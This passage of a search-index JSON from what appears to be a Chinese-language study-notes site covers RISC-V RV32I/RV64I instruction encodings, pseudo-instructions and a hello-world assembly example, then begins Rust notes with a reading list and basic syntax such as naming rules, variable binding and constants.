\u00b14KiB \u8303\u56f4\u5185 blt B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 100 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1ablt rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if less than\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bge B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 101 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abge rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08branch if greater than or equal\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u6709\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bltu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 110 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abltu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08blt unsigned\uff09\u5982\u679c rs1 < rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185 bgeu B \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[12,10:5] rs2 rs1 111 imm[4:1,11] 1100011 \u6307\u4ee4\u683c\u5f0f \uff1abgeu rs1, rs2, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\uff08bge unsigned\uff09\u5982\u679c rs1 >= rs2 \u5219 pc = pc+imm \u6ce8\u610f \uff1ars1 rs2 \u89c6\u4e3a\u65e0\u7b26\u53f7\u6570\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ef\u4ee5\u8df3\u8f6c\u5230 \u00b14KiB \u8303\u56f4\u5185","title":"branch \u7c7b\u6761\u4ef6\u8df3\u8f6c\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_10","text":"","title":"\u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#load","text":"lb I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alb rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5230 rd \u4f4e\u516b\u4f4d\uff0c\u518d\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lh I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 001 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alh rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 16 \u4f4d\u6570\u5230 rd \u4f4e 16 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u7b26\u53f7\u6269\u5c55 lw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 010 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alw rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d lbu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 100 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1albu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u653e\u5230 rd \u4f4e 8 \u4f4d\uff0c\u7136\u540e\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8\u4f4d\u5168\u8865 0\uff09 lhu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alhu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6 16 \u4f4d\u6570\u5b58\u5165 rd\uff0c\u5e76\u8fdb\u884c\u96f6\u6269\u5c55\uff08\u9ad8 16 \u4f4d\u5168\u4e3a 0\uff09","title":"load \u7c7b\u88c5\u8f7d\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#store","text":"sb S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 000 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asb rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 8 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sh S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 001 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1ash rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2 \u7684\u4f4e 16 \u4f4d\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d sw S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 010 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asw rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2\uff0832 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d","title":"store \u7c7b\u5b58\u50a8\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_11","text":"ecall I \u578b 31 20 19 15 14 12 11 7 6 0 000000000000 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aecall \u6307\u4ee4\u4f5c\u7528 \uff1a\u8bf7\u6c42\u73af\u5883\u8c03\u7528\uff08\u7c7b\u4f3c syscall\uff09\uff0cEEI \u4f1a\u5b9a\u4e49\u76f8\u5173\u53c2\u6570\u89c4\u8303\uff08\u4e00\u822c\u901a\u8fc7\u5bc4\u5b58\u5668\u4f20\u53c2\uff09 ebreak I \u578b 31 20 19 15 14 12 11 7 6 0 000000000001 00000 000 00000 1110011 \u6307\u4ee4\u683c\u5f0f \uff1aebreak \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06\u63a7\u5236\u6d41\u8f6c\u5230\u8c03\u8bd5\u73af\u5883","title":"\u73af\u5883\u8c03\u7528\u548c\u65ad\u70b9\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_12","text":"\u524d\u9762\u7684\u662f RV32I \u7684\u6240\u6709\u88ab\u7f16\u7801\u7684\u6307\u4ee4\uff0c\u4e0b\u9762\u662f\u53ef\u4ee5\u5728 RV32I \u6c47\u7f16\u7a0b\u5e8f\u4e2d\u5199\u7684\u4f2a\u6307\u4ee4\uff0c\u5b83\u4eec\u5c06\u88ab\u7f16\u8bd1\u5668\u7f16\u8bd1\u4e3a\u7b2c\u4e8c\u5217\u4e2d\u7684\u5b9e\u9645\u6307\u4ee4 .small-table table { font-size: 0.55rem !important; } \u4f2a\u6307\u4ee4 \u5b9e\u9645\u6307\u4ee4 \u610f\u4e49 la/lla rd, symbol auipc rd, delta[31 : 12] + delta[11] addi rd, rd, delta[11:0] \u52a0\u8f7d\u7edd\u5bf9\u5730\u5740 delta = symbol - pc l{b|h|w} rd, symbol auipc rd, delta[31 : 12] + delta[11] l{b|h|w} rd, delta[11:0](rd) \u52a0\u8f7d\u5168\u5c40\u53d8\u91cf s{b|h|w} rd, symbol, rt auipc rt, delta[31 : 12] + delta[11] s{b|h|w} rd, delta[11:0](rt) \u4fdd\u5b58\u5168\u5c40\u53d8\u91cf nop addi x0, x0, 0 li rd, imm ... \u5c06\u7acb\u5373\u6570\u52a0\u8f7d\u5230 rd \u4e2d mov rd, rs addi rd, rs, 0 \u4ece rs \u62f7\u8d1d\u5230 rd not rd, rs xori rd, rs, -1 rd = ~rs \u6309\u4f4d\u53d6\u53cd neg rd, rs sub rd, x0, rs rd = -rs seqz rd, rs sltiu rd, rs, 1 set rd if rs == 0 snez rd, rs sltu rd, x0, rs set rd if rs != 0 sltz rd, rs slt rd, rs, x0 set rd if rs < 0 sgtz rd, rs slt rd, x0, rs set rd if rs > 0 beqz rs, offset beq rs, x0, offset branch if rs == 0 bnez rs, offset bne rs, x0, offset branch if rs != 0 blez rs, offset bge x0, rs, offset branch if rs <= 0 bgez rs, offset bge rs, x0, offset branch if rs >= 0 bltz rs, offset blt rs, x0, offset branch if rs < 0 bgtz rs, offset blt x0, rs, offset branch if rs > 0 bgt rs, rt, offset blt rt, rs, offset branch if rs > rt ble rs, rt, offset bge rt, rs, offset branch if rs <= rt bgtu rs, rt, offset bltu rt, rs, offset branch if > unsigned bleu rs, rt, offset bgeu rt, rs, offset branch if <= unsigned j offset jal x0, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u4e0d\u5b58\u8fd4\u56de\u5730\u5740 jal offset jal x1, offset \u65e0\u6761\u4ef6\u8df3\u8f6c\uff0c\u8fd4\u56de\u5730\u5740\u5b58\u5230 x1 jr rs jalr x0, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5ffd\u7565\u8fd4\u56de\u5730\u5740 jalr rs jalr x1, 0(rs) \u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 rs \u4f4d\u7f6e\uff0c\u5b58\u8fd4\u56de\u5730\u5740 ret jalr x0, 0(x1) \u901a\u8fc7\u8fd4\u56de\u5730\u5740 x1 \u8fd4\u56de call offset auipc x1, offset[31 : 12] + offset[11] jalr x1, offset[11:0](x1) \u8fdc\u8c03\u7528 tail offset auipc x6, offset[31 : 12] + offset[11] jalr x0, offset[11:0](x6) \u5ffd\u7565\u8fd4\u56de\u5730\u5740\u8fdc\u8c03\u7528","title":"\u6c47\u7f16\u4f2a\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#rv64i","text":"RV64I \u7684\u5bc4\u5b58\u5668\u957f\u5ea6\u548c\u5730\u5740\u7a7a\u95f4\u957f\u5ea6\u90fd\u662f 64 \u4f4d\uff0c\u6307\u4ee4\u957f\u5ea6\u4ecd\u662f 32 \u4f4d\u3002\u9664\u6b64\u4e4b\u5916\u6bd4 RV32I \u591a\u4e86\u4e00\u4e9b\u9488\u5bf9 64/32 \u4f4d\u7684\u6307\u4ee4","title":"RV64I \u9644\u52a0\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#_13","text":"","title":"\u6574\u578b\u8ba1\u7b97\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#32","text":"addiw I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 000 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1aaddiw rd, rs1, imm \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u4e0e imm \u76f8\u52a0\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d \u6ce8\u610f \uff1aaddiw rd, rs1, 0 \u76f8\u5f53\u4e8e\u5c06 rs1 \u4f4e 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d\uff0c\u6c47\u7f16\u4f2a\u4ee3\u7801\u53ef\u5199\u4e3a sext.w rd, rs1 slliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 001 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1aslliw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u5de6\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d srliw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0000000 shamt rs1 101 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1asrliw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sraiw i \u578b\uff08\u6539\uff09 31 25 24 20 19 15 14 12 11 7 6 0 0100000 shamt rs1 101 rd 0011011 \u6307\u4ee4\u683c\u5f0f \uff1asraiw rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs1 \u7684\u4f4e 32 \u4f4d\u7b97\u6570\u53f3\u79fb shamt \u4f4d\uff0c\u7ed3\u679c\u5b58\u5230 rd \u7684\u4f4e 32 \u4f4d\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d addw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 000 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1aaddw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u52a0\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d subw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 000 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asubw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u51cf\u6cd5\uff0c\u5f97\u5230 32 \u4f4d\u7ed3\u679c\uff08\u5ffd\u7565\u6ea2\u51fa\uff09\uff0c\u5e76\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sllw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 001 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asllw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u5de6\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d srlw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0000000 rs2 rs1 101 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asrlw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u903b\u8f91\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d sraw r \u578b 31 25 24 20 19 15 14 12 11 7 6 0 0100000 rs2 rs1 101 rd 0111011 \u6307\u4ee4\u683c\u5f0f \uff1asraw rd, rs1, rs2 \u6307\u4ee4\u4f5c\u7528 \uff1a\u4f4e 32 \u4f4d\u7b97\u672f\u53f3\u79fb\uff0c\u7ed3\u679c\u7531 32 \u4f4d\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d","title":"32 \u4f4d\u6574\u578b\u8ba1\u7b97"},{"location":"cs/pl/riscv/unprivileged/#_14","text":"slli\u3001srli\u3001srai \u4e09\u6761\u6307\u4ee4\u4fee\u6539\u4e86\u683c\u5f0f\uff1a slli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 001 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1aslli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u5de6\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 slli \u591a\u4e86\u4e00\u4f4d shamt srli i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 000000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrli rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u903b\u8f91\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srli \u591a\u4e86\u4e00\u4f4d shamt srai i \u578b\uff08\u6539\uff09 31 26 25 20 19 15 14 12 11 7 6 0 010000 shamt rs1 101 rd 0010011 \u6307\u4ee4\u683c\u5f0f \uff1asrai rd, rs1, shamt \u6307\u4ee4\u4f5c\u7528 \uff1a\u7b97\u6570\u53f3\u79fb\u8fd0\u7b97\uff0cshamt \u6709 6 \u4f4d \u6ce8\u610f \uff1a\u683c\u5f0f\u4e0a\u6bd4 RV32I \u7684 srai \u591a\u4e86\u4e00\u4f4d shamt \u5176\u5b83\u683c\u5f0f\u6ca1\u6709\u4fee\u6539\u4f46\u529f\u80fd\u6709\u8c03\u6574\u7684\u6307\u4ee4\uff1a SLL/SRL/SRA \uff1a\u79fb\u4f4d\u4f4d\u6570\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 6 \u4f4d\uff08RV32I \u662f\u53d6\u51b3\u4e8e rs2 \u7684\u4f4e 5 \u4f4d\uff09 LUI \uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u653e\u5165 rd \u7684 31~12 \u4f4d\uff0c\u4f4e 12 \u4f4d\u7f6e 0\uff0c\u7136\u540e\u7b26\u53f7\u6269\u5c55\u5230 64 \u4f4d AUIPC \uff1a\u5c06 20 \u4f4d\u7acb\u5373\u6570\u540c LUI \u4e00\u6837\u5904\u7406\uff0c\u7136\u540e\u52a0\u4e0a pc \u503c\u653e\u5165 rd","title":"\u5176\u5b83\u6307\u4ee4\u4fee\u6539"},{"location":"cs/pl/riscv/unprivileged/#_15","text":"ld I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 011 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1ald rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 64 \u4f4d\u6570\u5230 rd \u4e2d lwu I \u578b 31 20 19 15 14 12 11 7 6 0 imm[11:0] rs1 101 rd 0000011 \u6307\u4ee4\u683c\u5f0f \uff1alwu rd, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u4ece rs1 + imm \u5904\u5185\u5b58\u8bfb\u53d6\u4e00\u4e2a 32 \u4f4d\u6570\u5230 rd \u4e2d\uff0c\u7136\u540e\u96f6\u6269\u5c55\u5230 64 \u4f4d sd S \u578b 31 25 24 20 19 15 14 12 11 7 6 0 imm[11:5] rs2 rs1 011 imm[4:0] 0100011 \u6307\u4ee4\u683c\u5f0f \uff1asd rs2, imm(rs1) \u6307\u4ee4\u4f5c\u7528 \uff1a\u5c06 rs2\uff0864 \u4f4d\uff09\u62f7\u8d1d\u5230 rs1 + imm \u5904\u5185\u5b58\u4e2d","title":"\u88c5\u8f7d\u5b58\u50a8\u6307\u4ee4"},{"location":"cs/pl/riscv/unprivileged/#zicsr","text":"\u89c1 \u7279\u6743\u7ea7\u90e8\u5206 > \u63a7\u5236\u548c\u72b6\u6001\u5bc4\u5b58\u5668\uff08CSRs\uff09> CSR \u6307\u4ee4\uff08Zicsr \u6269\u5c55\uff09","title":"Zicsr \u6269\u5c55"},{"location":"cs/pl/riscv/unprivileged/#_16","text":".text .align 2 .globl main main: addi sp , sp , -16 sw ra , 12 ( sp ) lui a0 , %hi ( string1 ) addi a0 , a0 , %lo ( string1 ) lui a1 , %hi ( string2 ) addi a1 , a1 , %lo ( string2 ) call printf lw ra , 12 ( sp ) addi sp , sp , 16 li a0 , 0 ret .section .rodata .balign 4 string1: .string \"Hello, %s!\\n\" string2: .string \"world\" .text\uff1a\u8fdb\u5165\u4ee3\u7801\u6bb5 .align 2\uff1a\u4ee3\u7801\u6bb5\u5bf9\u9f50\u5230 2^2 \u5b57\u8282 .globl main\uff1a\u58f0\u660e\u5168\u5c40\u6807\u53f7 main .section .rodata\uff1a\u8fdb\u5165 rodata \u6bb5 .balign 4\uff1a\u5bf9\u9f50\u6570\u636e\u6bb5\u5230 4 \u5b57\u8282 .string ... \u5b9a\u4e49\u5b57\u7b26\u4e32 \u5176\u5b83\u6307\u4ee4\uff1a .data\uff1a\u8fdb\u5165\u6570\u636e\u6bb5 .bss\uff1a\u8fdb\u5165 bss \u6bb5 .byte b1, b2, ..., bn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\u8282 .half w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u534a\u5b57\uff0816 \u4f4d\uff09 .word w1, w2, ..., wn\uff1a\u5b58\u653e\u4e00\u4e9b\u5b57\uff0832 \u4f4d\uff09","title":"\u6c47\u7f16\u4ee3\u7801"},{"location":"cs/pl/rust/","text":"Rust \u00b6 A language empowering everyone to build reliable and efficient software. \u2014\u2014\u2014\u2014 Rust \u5b98\u7f51 Rust \u662f\u7531 Mozilla \u4e3b\u5bfc\u5f00\u53d1\u7684\u901a\u7528\u3001\u7f16\u8bd1\u578b\u7f16\u7a0b\u8bed\u8a00\u3002\u8bbe\u8ba1\u51c6\u5219\u4e3a\u201c\u5b89\u5168\u3001\u5e76\u53d1\u3001\u5b9e\u7528\u201d\uff0c\u652f\u6301\u51fd\u6570\u5f0f\u3001\u5e76\u53d1\u5f0f\u3001\u8fc7\u7a0b\u5f0f\u4ee5\u53ca\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u98ce\u683c\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1 Table of Contents \u00b6 Rust \u8bed\u6cd5\u57fa\u7840 Rust \u6742\u9879\u968f\u8bb0 Reading List \u00b6 Rust \u5723\u7ecf course.rs \u9508\u4e66 rusty.rs Rust By Example https://doc.rust-lang.org/stable/rust-by-example/ https://rustwiki.org/zh-CN/rust-by-example/ Cargo Book https://doc.rust-lang.org/cargo/index.html https://rustwiki.org/zh-CN/cargo/ The Edition Guide https://doc.rust-lang.org/edition-guide/introduction.html https://www.rustwiki.org.cn/zh-CN/edition-guide/ Command Line Applications in Rust https://rust-cli.github.io/book/index.html The Rust Reference https://doc.rust-lang.org/stable/reference/ https://rustwiki.org/zh-CN/reference/ The Rustonomicon https://doc.rust-lang.org/nomicon/index.html https://nomicon.purewhite.io/ Rust \u4ee3\u7801\u9274\u8d4f algos.rs The Little Book of Rust Macros https://veykril.github.io/tlborm/introduction.html https://zjp-cn.github.io/tlborm/","title":"Rust"},{"location":"cs/pl/rust/#rust","text":"A language empowering everyone to build reliable and efficient software. \u2014\u2014\u2014\u2014 Rust \u5b98\u7f51 Rust \u662f\u7531 Mozilla \u4e3b\u5bfc\u5f00\u53d1\u7684\u901a\u7528\u3001\u7f16\u8bd1\u578b\u7f16\u7a0b\u8bed\u8a00\u3002\u8bbe\u8ba1\u51c6\u5219\u4e3a\u201c\u5b89\u5168\u3001\u5e76\u53d1\u3001\u5b9e\u7528\u201d\uff0c\u652f\u6301\u51fd\u6570\u5f0f\u3001\u5e76\u53d1\u5f0f\u3001\u8fc7\u7a0b\u5f0f\u4ee5\u53ca\u9762\u5411\u5bf9\u8c61\u7684\u7f16\u7a0b\u98ce\u683c\u3002 \u2014\u2014\u2014\u2014 \u7ef4\u57fa\u767e\u79d1","title":"Rust"},{"location":"cs/pl/rust/#table-of-contents","text":"Rust \u8bed\u6cd5\u57fa\u7840 Rust \u6742\u9879\u968f\u8bb0","title":"Table of Contents"},{"location":"cs/pl/rust/#reading-list","text":"Rust \u5723\u7ecf course.rs \u9508\u4e66 rusty.rs Rust By Example https://doc.rust-lang.org/stable/rust-by-example/ https://rustwiki.org/zh-CN/rust-by-example/ Cargo Book https://doc.rust-lang.org/cargo/index.html https://rustwiki.org/zh-CN/cargo/ The Edition Guide https://doc.rust-lang.org/edition-guide/introduction.html https://www.rustwiki.org.cn/zh-CN/edition-guide/ Command Line Applications in Rust https://rust-cli.github.io/book/index.html The Rust Reference https://doc.rust-lang.org/stable/reference/ https://rustwiki.org/zh-CN/reference/ The Rustonomicon https://doc.rust-lang.org/nomicon/index.html https://nomicon.purewhite.io/ Rust \u4ee3\u7801\u9274\u8d4f algos.rs The Little Book of Rust Macros https://veykril.github.io/tlborm/introduction.html https://zjp-cn.github.io/tlborm/","title":"Reading List"},{"location":"cs/pl/rust/basic/","text":"Rust \u8bed\u6cd5\u57fa\u7840 \u00b6 Abstract \u57fa\u7840\u8bed\u6cd5\uff0c\u7b2c\u4e8c\u904d\u5b66\u7684\u65f6\u5019\u505a\u4e86\u70b9\u7b14\u8bb0 \u53c2\u8003\uff1a Rust \u5723\u7ecf\uff0c course.rs The Rust Programming Language\uff0c https://doc.rust-lang.org/book/ \u53d8\u91cf \u00b6 \u6807\u8bc6\u7b26\u547d\u540d \u00b6 \u539f\u751f\u6807\u8bc6\u7b26\uff08raw identifiers\uff09 \u5173\u952e\u5b57\u4e0d\u80fd\u4f5c\u4e3a\u6807\u8bc6\u7b26\u540d\u79f0 \u52a0\u4e0a r # \u524d\u7f00\u540e\u53ef\u4ee5\u4f7f\u7528\uff0c\u6bd4\u5982 r # match \u547d\u540d\u89c4\u8303\uff1a \u7c7b\u578b \u60ef\u4f8b\u65b9\u5f0f \u6a21\u5757 Modules snake_case \u7c7b\u578b Types UpperCamelCase \u7279\u5f81 Traits UpperCamelCase \u679a\u4e3e Enumerations UpperCamelCase \u7ed3\u6784\u4f53 Structs UpperCamelCase \u51fd\u6570 Functions snake_case \u65b9\u6cd5 Methods snake_case \u901a\u7528\u6784\u9020\u5668 General constructors new or with_more_details \u8f6c\u6362\u6784\u9020\u5668 Conversion constructors from_some_other_type \u5b8f Macros snake_case! \u5c40\u90e8\u53d8\u91cf Local variables snake_case \u9759\u6001\u7c7b\u578b Statics SCREAMING_SNAKE_CASE \u5e38\u91cf Constants SCREAMING_SNAKE_CASE \u7c7b\u578b\u53c2\u6570 Type parameters UpperCamelCase \uff0c\u901a\u5e38\u4f7f\u7528\u4e00\u4e2a\u5927\u5199\u5b57\u6bcd: T \u751f\u547d\u5468\u671f Lifetimes \u901a\u5e38\u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd: 'a\uff0c'de\uff0c'src \u53d8\u91cf\u7ed1\u5b9a\u4e0e\u53ef\u53d8\u6027 \u00b6 rust \u4f7f\u7528 let \u5173\u952e\u5b57\u6765\u8fdb\u884c\u53d8\u91cf\u7ed1\u5b9a\uff0c\u5373 let a = 1 ; \u800c rust \u7684\u53d8\u91cf\u9ed8\u8ba4\u662f\u4e0d\u53ef\u53d8\uff08immutable\uff09\u7684\uff0c\u4f7f\u4e4b\u53d8\u6210\u53ef\u53d8\u7684\u9700\u8981\u5728 let \u540e\u9762\u52a0\u4e0a mut\uff0c\u5982\u679c\u540e\u9762\u4e0d\u4f1a\u6539\u53d8\u7684\u53d8\u91cf\u88ab\u58f0\u660e\u4e3a\u4e86 mutable \u7684\uff0c\u7f16\u8bd1\u5668\u4f1a\u7ed9\u51fa\u8b66\u544a \u5b58\u5728\u6ca1\u6709\u4f7f\u7528\u7684\u53d8\u91cf\u7684\u8bdd\u7f16\u8bd1\u5668\u4e5f\u4f1a\u7ed9\u51fa\u8b66\u544a\uff0c\u5728\u53d8\u91cf\u540d\u524d\u52a0\u4e0a\u5355\u4e0b\u5212\u7ebf\u5373\u53ef\u5ffd\u7565 \u53d8\u91cf\u89e3\u6784 \u00b6 \u7c7b\u4f3c\u4e8e python \u7684\u5143\u7d20\u89e3\u5305 let ( a , mut b ) : ( bool , bool ) = ( true , false ); let ( a , b , c , d ); ( a , b ) = ( 1 , 2 ); [ c , .. , d , _ ] = [ 1 , 2 , 3 , 4 , 5 ]; // c = 1, d = 4 \u5e38\u91cf \u00b6 \u5e38\u91cf\u4f7f\u7528 const \u5173\u952e\u5b57\u6765\u5b9a\u4e49\uff0c\u4e14\u5fc5\u987b\u6307\u5b9a\u7c7b\u578b\uff0c\u547d\u540d\u901a\u5e38\u4e3a\u86c7\u5f62\u5168\u5927\u5199\uff0cconst \u540e\u9762\u4e5f\u4e0d\u5141\u8bb8\u4f7f\u7528 mut\uff0c\u53ef\u4ee5\u5728\u4efb\u610f\u4f5c\u7528\u57df\u5185\u58f0\u660e const MAX_VALUE : u32 = 100_000 ; \u53d8\u91cf\u906e\u853d \u00b6 rust 